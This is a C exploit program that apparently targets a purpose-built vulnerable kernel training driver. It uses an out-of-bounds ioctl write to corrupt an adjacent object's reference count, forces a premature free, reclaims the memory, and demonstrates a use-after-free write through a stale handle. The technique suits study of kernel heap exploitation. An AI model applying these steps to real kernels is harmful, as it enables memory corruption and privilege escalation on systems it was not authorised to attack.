#define _GNU_SOURCE
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEVICE_PATH "/dev/uv_oob_dev"

#define IOCTL_MAGIC 'Y'
#define IOCTL_ALLOC_VULN _IOWR(IOCTL_MAGIC, 0x01, int)
#define IOCTL_FREE_VULN _IOW(IOCTL_MAGIC, 0x02, int)
#define IOCTL_WRITE_VULN _IOW(IOCTL_MAGIC, 0x03, int)
#define IOCTL_ALLOC_REFVICTIM _IOWR(IOCTL_MAGIC, 0x17, int)
#define IOCTL_PUT_REFVICTIM _IOW(IOCTL_MAGIC, 0x18, int)
#define IOCTL_WRITE_REFVICTIM _IOW(IOCTL_MAGIC, 0x19, int)
#define IOCTL_READ_REFVICTIM _IOR(IOCTL_MAGIC, 0x1A, int)
#define IOCTL_ALLOC_RECLAIM _IOWR(IOCTL_MAGIC, 0x1B, int)
#define IOCTL_FREE_RECLAIM _IOW(IOCTL_MAGIC, 0x1C, int)
#define IOCTL_READ_RECLAIM _IOR(IOCTL_MAGIC, 0x1E, int)

#define BUF_SIZE 512
#define VULN_OBJECT_SIZE 520

struct request_arg {
  int handler;
  int offset;
  int length;
  char *value;
};

static int pin_cpu0(void) {
  cpu_set_t set;

  CPU_ZERO(&set);
  CPU_SET(0, &set);
  if (sched_setaffinity(getpid(), sizeof(set), &set) < 0) {
    perror("[-] sched_setaffinity failed");
    return -1;
  }
  printf("[+] Process pinned to CPU 0.\n");
  return 0;
}

static int read_refvictim(int fd, int handler, char *buf, int len) {
  struct request_arg req;

  memset(buf, 0, len);
  req.handler = handler;
  req.offset = 0;
  req.length = len - 1;
  req.value = buf;
  return ioctl(fd, IOCTL_READ_REFVICTIM, &req);
}

static int read_reclaim(int fd, int handler, char *buf, int len) {
  struct request_arg req;

  memset(buf, 0, len);
  req.handler = handler;
  req.offset = 0;
  req.length = len - 1;
  req.value = buf;
  return ioctl(fd, IOCTL_READ_RECLAIM, &req);
}

int main(void) {
  int fd;
  int oob_handler;
  int refvictim_handler;
  int reclaim_handler;
  int fake_refcnt = 1;
  char read_buf[BUF_SIZE];
  char uaf_payload[] = "uaf write via stale refvictim";
  struct request_arg req;

  printf("[*] Kernel OOB RefcountUAF Simulation\n");

  if (pin_cpu0() < 0)
    return -1;

  fd = open(DEVICE_PATH, O_RDWR);
  if (fd < 0) {
    perror("[-] Failed to open the device");
    return -1;
  }
  printf("[+] Device opened successfully.\n");

  if (ioctl(fd, IOCTL_ALLOC_REFVICTIM, &refvictim_handler) < 0) {
    perror("[-] Failed to allocate refvictim");
    close(fd);
    return -1;
  }
  printf("[+] Allocated refvictim with handler: %d\n", refvictim_handler);

  if (ioctl(fd, IOCTL_ALLOC_VULN, &oob_handler) < 0) {
    perror("[-] Failed to allocate OOB vuln");
    close(fd);
    return -1;
  }
  printf("[+] Allocated OOB vuln with handler: %d\n", oob_handler);

  if (read_refvictim(fd, refvictim_handler, read_buf, sizeof(read_buf)) < 0) {
    perror("[-] Failed to read original refvictim");
    close(fd);
    return -1;
  }
  printf("[+] Before corruption, refvictim data: %s\n", read_buf);

  printf("[+] Overwriting refvictim->refcnt with 1 via OOB write...\n");
  req.handler = oob_handler;
  req.offset = VULN_OBJECT_SIZE;
  req.length = sizeof(fake_refcnt);
  req.value = (char *)&fake_refcnt;
  if (ioctl(fd, IOCTL_WRITE_VULN, &req) < 0) {
    perror("[-] Failed to corrupt refcount");
    close(fd);
    return -1;
  }
  printf("[+] Refcount corruption request sent.\n");

  if (ioctl(fd, IOCTL_PUT_REFVICTIM, &refvictim_handler) < 0) {
    perror("[-] Failed to put refvictim");
    close(fd);
    return -1;
  }
  printf("[+] Put refvictim. If refcnt was corrupted to 1, it is now freed.\n");

  if (ioctl(fd, IOCTL_ALLOC_RECLAIM, &reclaim_handler) < 0) {
    perror("[-] Failed to allocate reclaim object");
    close(fd);
    return -1;
  }
  printf("[+] Allocated reclaim object with handler: %d\n", reclaim_handler);

  if (read_refvictim(fd, refvictim_handler, read_buf, sizeof(read_buf)) < 0) {
    perror("[-] Failed to read through stale refvictim handler");
    close(fd);
    return -1;
  }
  printf("[+] Stale refvictim read: %s\n", read_buf);

  req.handler = refvictim_handler;
  req.offset = 0;
  req.length = sizeof(uaf_payload);
  req.value = uaf_payload;
  if (ioctl(fd, IOCTL_WRITE_REFVICTIM, &req) < 0) {
    perror("[-] Failed to write through stale refvictim handler");
    close(fd);
    return -1;
  }
  printf("[+] Wrote through stale refvictim handler.\n");

  if (read_reclaim(fd, reclaim_handler, read_buf, sizeof(read_buf)) < 0) {
    perror("[-] Failed to read reclaim object");
    close(fd);
    return -1;
  }
  printf("[+] Direct reclaim read after stale write: %s\n", read_buf);

  if (strcmp(read_buf, uaf_payload) == 0) {
    printf("[+] RefcountUAF demonstrated: stale refvictim write modified "
           "reclaim data.\n");
  } else {
    printf("[!] Reclaim data did not match the stale write payload.\n");
    printf("[!] Check dmesg to see whether reclaim reused the refvictim "
           "address.\n");
  }

  if (ioctl(fd, IOCTL_FREE_RECLAIM, &reclaim_handler) < 0)
    perror("[-] Failed to free reclaim");
  if (ioctl(fd, IOCTL_FREE_VULN, &oob_handler) < 0)
    perror("[-] Failed to free vuln");

  close(fd);
  return 0;
}
